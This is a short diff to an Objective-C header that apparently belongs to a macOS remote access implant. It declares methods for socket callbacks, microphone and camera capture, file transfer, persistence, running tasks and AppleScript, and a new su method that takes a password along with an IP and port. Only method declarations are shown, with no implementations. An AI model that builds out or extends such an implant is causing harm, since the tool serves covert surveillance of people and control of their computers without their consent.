@@ -19,13 +19,15 @@
 
 //convenience
 -(void)blank;
-
+-(void)debugLog:(NSString *)string;
+    
 //socks
 extern int sockfd;
+extern bool debug;
 
 -(int)connect:(NSString*)host :(long)port;
 -(void)sendString:(NSString *)string;
--(void)livesendString:(NSString *)string;
+-(void)liveSendString:(NSString *)string;
 
 //mic
 -(void)mic:(NSString *)arg;
@@ -41,11 +43,12 @@ extern int sockfd;
 -(AVCaptureDevice *)getcapturedevice;
 
 //file management
+/*
 -(void)directoryList:(NSString *)arg;
--(NSData*)filePathToData:(NSString *)arg;
 -(void)rmFile:(NSString *)arg;
+*/
+-(NSData*)filePathToData:(NSString *)arg;
 -(void)changeWD:(NSString *)arg;
--(void)receiveFile:(NSString *)saveToPath;
 -(void)receiveFileData:(NSString *)saveToPath :(long)fileSize;
 -(void)sendFileData:(NSData*)fileData;
 
@@ -60,8 +63,8 @@ extern int sockfd;
 -(void)removePersistence:(NSString *)ip :(int)port;
 -(void)openURL:(NSString *)arg;
 -(void)runtask:(NSString *)cmd;
--(void)runAppleScript:(NSString *)arg;
--(void)receivedData:(NSNotification *)notif;
+-(void)su:(NSString *)pass :(NSString *)ip :(int)port;
+-(void)runAppleScript:(NSString *)cmd :(NSString *)args;
 -(NSData *)GetMACAddress;
 -(NSString *)GetMACAddressDisplayString;
 
